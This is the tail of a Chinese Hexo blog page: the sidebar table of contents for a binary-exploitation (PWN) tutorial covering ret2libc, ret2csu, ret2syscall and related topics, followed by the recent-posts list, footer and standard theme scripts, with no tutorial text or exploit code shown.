href="#%E5%AF%B9%E6%AF%94"><span class="toc-number">2.2.1.</span> <span class="toc-text"> 对比</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-number">2.2.2.</span> <span class="toc-text"> exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%9C%E4%B8%9A2"><span class="toc-number">2.3.</span> <span class="toc-text"> 作业2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%982"><span class="toc-number">2.4.</span> <span class="toc-text"> 例题2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E7%82%B9%E5%88%86%E6%9E%90"><span class="toc-number">2.4.1.</span> <span class="toc-text"> 重点分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%9C%E4%B8%9A3"><span class="toc-number">2.5.</span> <span class="toc-text"> 作业3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%983"><span class="toc-number">2.6.</span> <span class="toc-text"> 例题3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%9564%E4%BD%8D%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="toc-number">2.6.1.</span> <span class="toc-text"> 测试64位函数调用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2libc"><span class="toc-number">3.</span> <span class="toc-text"> ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-2"><span class="toc-number">3.1.</span> <span class="toc-text"> 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5"><span class="toc-number">3.1.1.</span> <span class="toc-text"> 链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80"><span class="toc-number">3.1.2.</span> <span class="toc-text"> 地址</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9D%E5%AF%B9%E5%9C%B0%E5%9D%80"><span class="toc-number">3.1.2.1.</span> <span class="toc-text"> 绝对地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B8%E5%AF%B9%E5%9C%B0%E5%9D%80"><span class="toc-number">3.1.2.2.</span> <span class="toc-text"> 相对地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="toc-number">3.1.2.3.</span> <span class="toc-text"> 偏移量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97libc%E5%BA%93%E4%B8%AD%E6%9F%90%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84%E7%BB%9D%E5%AF%B9%E5%9C%B0%E5%9D%80"><span class="toc-number">3.1.2.4.</span> <span class="toc-text"> 计算libc库中某个函数的绝对地址</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8"><span class="toc-number">3.1.3.</span> <span class="toc-text"> plt表和got表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%981-2"><span class="toc-number">3.2.</span> <span class="toc-text"> 例题1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">3.2.1.</span> <span class="toc-text"> 分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E8%B0%83"><span class="toc-number">3.2.2.</span> <span class="toc-text"> 动调</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90write%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.3.</span> <span class="toc-text"> 分析write函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F%E8%BF%9B%E5%85%A5write%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-number">3.2.4.</span> <span class="toc-text"> 分析程序进入write函数的过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%80%9D%E8%B7%AF"><span class="toc-number">3.2.5.</span> <span class="toc-text"> 漏洞思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%982-2"><span class="toc-number">3.3.</span> <span class="toc-text"> 例题2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%983-2"><span class="toc-number">3.4.</span> <span class="toc-text"> 例题3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2csu"><span class="toc-number">4.</span> <span class="toc-text"> ret2csu</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">4.1.</span> <span class="toc-text"> 介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%981-3"><span class="toc-number">4.2.</span> <span class="toc-text"> 例题1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2syscall"><span class="toc-number">5.</span> <span class="toc-text"> ret2syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-2"><span class="toc-number">5.1.</span> <span class="toc-text"> 介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#system%E5%87%BD%E6%95%B0%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-number">5.2.</span> <span class="toc-text"> system函数的实现过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#system%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81"><span class="toc-number">5.2.1.</span> <span class="toc-text"> system反编译代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#execve%E5%87%BD%E6%95%B0"><span class="toc-number">5.2.2.</span> <span class="toc-text"> execve函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%80%9D%E8%B7%AF-2"><span class="toc-number">5.2.3.</span> <span class="toc-text"> 漏洞思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E6%A0%88%E6%80%9D%E8%B7%AF"><span class="toc-number">5.2.4.</span> <span class="toc-text"> 布栈思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%981-4"><span class="toc-number">5.3.</span> <span class="toc-text"> 例题1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%982-3"><span class="toc-number">5.4.</span> <span class="toc-text"> 例题2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">6.</span> <span class="toc-text"> ret2shellcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%B2%A1%E6%9C%89libc%E5%BA%93"><span class="toc-number">7.</span> <span class="toc-text"> 题目没有libc库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#libc-database"><span class="toc-number">7.1.</span> <span class="toc-text"> libc-database</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#libc-database%E4%B8%8B%E8%BD%BD%E5%88%B0%E6%9C%AC%E5%9C%B0"><span class="toc-number">7.2.</span> <span class="toc-text"> libc-database下载到本地</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA"><span class="toc-number">8.</span> <span class="toc-text"> 数据溢出</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B2%A1%E6%9C%89binsh%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">9.</span> <span class="toc-text"> 没有&#x2F;bin&#x2F;sh怎么办</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%B7%B1%E5%86%99binsh"><span class="toc-number">9.1.</span> <span class="toc-text"> 自己写&#x2F;bin&#x2F;sh</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99binsh%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="toc-number">9.1.1.</span> <span class="toc-text"> 写&#x2F;bin&#x2F;sh的地方</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E5%8E%BB%E5%86%99%E5%85%A5binsh"><span class="toc-number">9.1.2.</span> <span class="toc-text"> 怎么去写入&#x2F;bin&#x2F;sh</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E6%89%BEsh"><span class="toc-number">9.2.</span> <span class="toc-text"> 程序找&#x2F;sh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E4%B8%AD%E6%89%BE0"><span class="toc-number">9.3.</span> <span class="toc-text"> 程序中找$0</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E4%BF%9D%E6%8A%A4%E9%97%AE%E9%A2%98"><span class="toc-number">10.</span> <span class="toc-text"> 权限保护问题</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/02/PWN%E7%B3%BB%E5%88%97blog/13PWN%E5%A0%86%E7%B3%BB%E5%88%97/" title="PWN堆系列">PWN堆系列</a><time datetime="2024-06-02T10:55:11.000Z" title="发表于 2024-06-02 18:55:11">2024-06-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/31/PWN%E7%B3%BB%E5%88%97blog/12PWN%E5%A0%86%E5%9F%BA%E7%A1%80/" title="PWN堆基础">PWN堆基础</a><time datetime="2024-05-31T07:57:27.000Z" title="发表于 2024-05-31 15:57:27">2024-05-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/29/IDAblog/IDA%E6%8F%92%E4%BB%B6/" title="IDA插件">IDA插件</a><time datetime="2024-05-28T23:49:12.000Z" title="发表于 2024-05-29 07:49:12">2024-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/17/python%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/" title="python课程作业">python课程作业</a><time datetime="2024-05-17T02:56:33.000Z" title="发表于 2024-05-17 10:56:33">2024-05-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/14/%E5%8D%95%E7%89%87%E6%9C%BA%E7%B3%BB%E5%88%97blog/STM32%E5%85%A5%E9%97%A8/" title="STM32入门">STM32入门</a><time datetime="2024-05-14T04:22:35.000Z" title="发表于 2024-05-14 12:22:35">2024-05-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By iyheart</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.1
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, '']
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typesetPromise()
+}</script><script>(()=>{
+  const loadLivere = () => {
+    if (typeof LivereTower === 'object') window.LivereTower.init()
+    else {
+      (function(d, s) {
+          var j, e = d.getElementsByTagName(s)[0];
+          if (typeof LivereTower === 'function') { return; }
+          j = d.createElement(s);
+          j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+          j.async = true;
+          e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    }
+  }
+
+  if ('Livere' === 'Livere' || !false) {
+    if (false) btf.loadComment(document.getElementById('lv-container'), loadLivere)
+    else loadLivere()
+  } else {
+    window.loadOtherComment = loadLivere
+  }
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
